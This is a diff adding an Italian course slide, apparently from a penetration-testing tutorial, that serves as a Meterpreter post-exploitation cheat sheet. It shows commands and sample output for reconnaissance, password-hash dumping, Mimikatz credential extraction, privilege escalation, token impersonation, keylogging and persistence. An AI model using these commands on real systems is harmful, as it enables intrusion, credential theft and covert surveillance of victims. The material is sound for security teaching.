@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Utilizzo di Meterpreter</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">💻 Utilizzo di Meterpreter</h1>
+        <div class="subtitle">Comandi essenziali per la post-exploitation</div>
+
+        <div class="card border-purple" style="margin-bottom: 25px;">
+            <div class="card-title">🎯 Comandi Core</div>
+            <div class="card-text">
+                <div class="grid-2-col">
+                    <div>
+                        <p><strong>Informazioni Sistema:</strong></p>
+                        <div class="code-box">meterpreter > sysinfo
+Computer        : TARGET-PC
+OS              : Windows 7 (6.1 Build 7601)
+Architecture    : x64
+System Language : en_US
+Meterpreter     : x64/windows</div>
+                        <br>
+                        <p><strong>Utente corrente:</strong></p>
+                        <div class="code-box">meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM</div>
+                    </div>
+                    <div>
+                        <p><strong>Processi attivi:</strong></p>
+                        <div class="code-box">meterpreter > ps
+PID   Name              User
+---   ----              ----
+0     [System Process]
+4     System            NT AUTHORITY\SYSTEM
+668   svchost.exe       NT AUTHORITY\SYSTEM</div>
+                        <br>
+                        <p><strong>Info rete:</strong></p>
+                        <div class="code-box">meterpreter > ipconfig
+meterpreter > arp
+meterpreter > route</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="grid-2-col">
+            <div class="card border-blue">
+                <div class="card-title">📁 File System</div>
+                <div class="card-text">
+                    <p><strong>Navigazione:</strong></p>
+                    <div class="code-box">meterpreter > pwd
+C:\Windows\system32
+
+meterpreter > cd C:\Users
+meterpreter > ls
+meterpreter > cat file.txt</div>
+                    <br>
+                    <p><strong>Trasferimento file:</strong></p>
+                    <div class="code-box">meterpreter > download file.txt
+meterpreter > upload tool.exe
+meterpreter > search -f *.txt</div>
+                </div>
+            </div>
+
+            <div class="card border-green">
+                <div class="card-title">🔐 Credenziali</div>
+                <div class="card-text">
+                    <p><strong>Hashdump:</strong></p>
+                    <div class="code-box">meterpreter > hashdump
+Administrator:500:hash1:hash2:::
+Guest:501:hash3:hash4:::</div>
+                    <br>
+                    <p><strong>Con Kiwi/Mimikatz:</strong></p>
+                    <div class="code-box">meterpreter > load kiwi
+meterpreter > creds_all
+meterpreter > kiwi_cmd sekurlsa::logonpasswords</div>
+                    <br>
+                    <p style="color: #4CAF50;">✅ Ottieni password in chiaro!</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="grid-2-col" style="margin-top: 25px;">
+            <div class="card border-yellow">
+                <div class="card-title">🔄 Process Migration</div>
+                <div class="card-text">
+                    <p>Migrare in un processo più stabile:</p>
+                    <div class="code-box">meterpreter > ps
+# Trova un processo stabile (es. explorer.exe)
+
+meterpreter > migrate 1234
+[*] Migrating from 5678 to 1234...
+[*] Migration completed successfully.</div>
+                    <br>
+                    <p style="color: #FFD54F;">⚠️ Migra in processi con stesso livello di privilegi o superiore!</p>
+                </div>
+            </div>
+
+            <div class="card border-red">
+                <div class="card-title">🚀 Privilege Escalation</div>
+                <div class="card-text">
+                    <p><strong>Tentativo automatico:</strong></p>
+                    <div class="code-box">meterpreter > getsystem
+...got system via technique 1.</div>
+                    <br>
+                    <p><strong>Suggerimenti exploit:</strong></p>
+                    <div class="code-box">meterpreter > run post/multi/recon/local_exploit_suggester</div>
+                    <br>
+                    <p><strong>Token impersonation:</strong></p>
+                    <div class="code-box">meterpreter > use incognito
+meterpreter > list_tokens -u</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card border-purple" style="margin-top: 25px;">
+            <div class="card-title">🎪 Comandi Avanzati</div>
+            <div class="card-text">
+                <div class="grid-3-col">
+                    <div>
+                        <p><strong>Screenshot & Keylog:</strong></p>
+                        <div class="code-box">meterpreter > screenshot
+meterpreter > keyscan_start
+meterpreter > keyscan_dump</div>
+                    </div>
+                    <div>
+                        <p><strong>Shell di Sistema:</strong></p>
+                        <div class="code-box">meterpreter > shell
+C:\Windows\system32> whoami
+nt authority\system</div>
+                    </div>
+                    <div>
+                        <p><strong>Persistenza:</strong></p>
+                        <div class="code-box">meterpreter > run persistence -X -i 60 -p 4444</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>const slideNumero = 18;</script>
+    <script src="main.js"></script>
+</body>
+</html>
